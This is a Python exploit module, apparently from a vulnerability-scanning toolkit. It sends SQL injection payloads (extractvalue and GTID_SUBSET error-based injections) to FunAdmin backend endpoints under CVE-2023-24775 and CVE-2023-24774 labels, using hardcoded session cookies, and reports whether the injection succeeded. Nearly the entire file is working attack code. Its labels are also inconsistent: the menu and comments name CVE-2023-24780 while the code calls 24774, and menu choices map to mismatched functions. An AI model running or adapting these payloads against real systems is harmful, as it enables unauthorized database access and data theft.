#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
import uuid
from pub.com.outprint import OutPrintInfo
from rich.prompt import Prompt
from pub.com.reqset import ReqSet
urllib3.disable_warnings()
'''Генирация X-CSRF-TOKEN'''

csrf_token = uuid.uuid4()
csrf_token = str(csrf_token)
csrf_token = csrf_token.replace('-', '')

'''Добавление общих для двух сплоиитов заголовков'''
headers = {}
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
headers["Accept"] = "application/json, text/javascript, */*"
headers["Accept-Language"] = "zh-CN,zh"
headers["X-Requested-With"] = "XMLHttpRequest"
headers["X-CSRF-TOKEN"] = csrf_token

'''Сплоит для CVE-2023-24775'''

class Cve_2023_24775:
    def poc_CVE_2023_24775(self,url):
        headers["Host"] = url
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["charset"] = "UTF-8"
        headers["Accept-Encoding"] = "gzip"

        url = str(url)
        url = url + "/backend/member.memberLevel/index?parentField=pid&"

        '''Добавление куки файлов - внимание если эти куки вам не подхдоят можете заменить на ваши сессионные куки '''
        cookies = {'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041', 'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51', 'think_lang': 'zh-cn', 'Hm_lvt_8dcaf664827c0e8ae52287ebb2411aed': '1674888420', 'Hm_lpvt_8dcaf664827c0e8ae52287ebb2411aed': '1674888420', 'auth_account': 'YToxOntzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI3OiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKdFpXMWlaWEpmYVdRaU9qRTFORGdzSW1Gd2NHbGtJam9pSWl3aVlYQndjMlZqY21WMElqb2lJaXdpYVhOeklqb2lhSFIwY0hNNkx5OTNkM2N1Wm5WdVlXUnRhVzR1WTI5dElpd2lZWFZrSWpvaWFIUjBjSE02THk5M2QzY3VablZ1WVdSdGFXNHVZMjl0SWl3aWMyTnZjR1Z6SWpvaWNtOXNaVjloWTJObGMzTWlMQ0pwWVhRaU9qRTJOelE0T0RrMU1EQXNJbTVpWmlJNk1UWTNORGc0T1RVd01Dd2laWGh3SWpveE5qYzFOVGd3TnpBd2ZRLkJITHd5WU5nNkpVVUZmMFFucGM0aHk2YlZ1c1V6WkVqR3N2SElva0pxYU0iO30%3D', 'clound_account': 'YTo0OntzOjI6ImlkIjtpOjE1NDg7czo4OiJ1c2VybmFtZSI7czoxMDoibXlmdW5hZG1pbiI7czo4OiJuaWNrbmFtZSI7czowOiIiO3M6NjoiYXZhdGFyIjtzOjM2OiIvc3RhdGljL2Zyb250ZW5kL2ltYWdlcy9hdmF0YXIvNi5qcGciO30%3D'}

        ''' Ввод sqli если вы не ввели ничего то ввод стандартной иньекции'''
        url = url + "selectFields%5Bname%5D=name&selectFields%5Bvalue%5D=extractvalue%281%2Cconcat%28char%28126%29%2Cuser()%29%29"

        OutPrintInfo("FunAdmin",url)

        '''Запрос на инькцию и вывод ответа'''
        sqli_request = requests.get(url, cookies=cookies, headers=headers,verify=self.verify,proxies=self.proxies)

        # print(sqli_request.text)

        '''Проверка есть в тексте ответа sqli_request "message", если есть то скорее всего сплоит работает: https://github.com/funadmin/funadmin/issues/9'''
        if ('message' in sqli_request.text):

            OutPrintInfo("FunAdmin",'[b bright_red]**POC CVE-2023-24775 sqli works** :)')
        else:

            OutPrintInfo("FunAdmin",'**POC CVE-2023-24775 sqli not works** :(')


    '''Сплоит для CVE-2023-24780'''


    def poc_CVE_2023_24774(self,url):
        headers["Host"] = url
        headers["Origin"] = url
        headers["Accept-Encoding"] = "gzip, deflate"

        url = str(url)
        url = url + "/databases/table/columns?id='"

        '''Добавление куки файлов - внимание если эти куки вам не подхдоят, можете заменить на ваши сессионные куки '''
        cookies = {'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041', 'ci_session': 'ca40t5m9pvlvp7gftr11qng0g0lofceq', 'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51', 'think_lang': 'zh-cn', 'Hm_lvt_8dcaf664827c0e8ae52287ebb2411aed': '1674888420', 'Hm_lpvt_8dcaf664827c0e8ae52287ebb2411aed': '1674888420', 'auth_account': 'YToxOntzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI3OiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKdFpXMWlaWEpmYVdRaU9qRTFORGdzSW1Gd2NHbGtJam9pSWl3aVlYQndjMlZqY21WMElqb2lJaXdpYVhOeklqb2lhSFIwY0hNNkx5OTNkM2N1Wm5WdVlXUnRhVzR1WTI5dElpd2lZWFZrSWpvaWFIUjBjSE02THk5M2QzY3VablZ1WVdSdGFXNHVZMjl0SWl3aWMyTnZjR1Z6SWpvaWNtOXNaVjloWTJObGMzTWlMQ0pwWVhRaU9qRTJOelE0T0RrMU1EQXNJbTVpWmlJNk1UWTNORGc0T1RVd01Dd2laWGh3SWpveE5qYzFOVGd3TnpBd2ZRLkJITHd5WU5nNkpVVUZmMFFucGM0aHk2YlZ1c1V6WkVqR3N2SElva0pxYU0iO30%3D',
                   'clound_account': 'YTo0OntzOjI6ImlkIjtpOjE1NDg7czo4OiJ1c2VybmFtZSI7czoxMDoibXlmdW5hZG1pbiI7czo4OiJuaWNrbmFtZSI7czowOiIiO3M6NjoiYXZhdGFyIjtzOjM2OiIvc3RhdGljL2Zyb250ZW5kL2ltYWdlcy9hdmF0YXIvNi5qcGciO30%3D'}

        ''' Ввод sqli, если вы не ввели ничего то ввод стандартной иньекции'''

        url = url + "+AND+GTID_SUBSET(CONCAT(0x12,(SELECT+(ELT(6415=6415,1))),user()),6415)--+qRTY"

        OutPrintInfo("FunAdmin",url)

        '''Запрос на инькцию и вывод ответа'''
        sqli_request = requests.get(url, cookies=cookies, headers=headers,verify=self.verify,proxies=self.proxies)

        print(sqli_request.text)

        '''Проверка есть в тексте ответа sqli_request "message", если есть то скорее всего сплоит работает: https://github.com/funadmin/funadmin/issues/6'''
        if ('message' in sqli_request.text):

            OutPrintInfo("FunAdmin",'**POC CVE-2023-24774 sqli works** :)')
        else:

            OutPrintInfo("FunAdmin",'**POC CVE-2023-24774 sqli not works** :(')


    def main(self,target):
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        _,self.proxies = ReqSet(proxy=target["proxy"])
        which_cve = int(Prompt.ask("[b red][1] CVE-2023-24780\n[2] CVE-2023-24775\n"))
        # which_cve = int(input("[1] CVE-2023-24780\n[2] CVE-2023-24775\n>>> "))
        if (which_cve == 1):
            self.poc_CVE_2023_24775(url)

        elif (which_cve == 2):
            self.poc_CVE_2023_24774(url)

        else:
            OutPrintInfo("FunAdmin",'输入参数错误')
            return
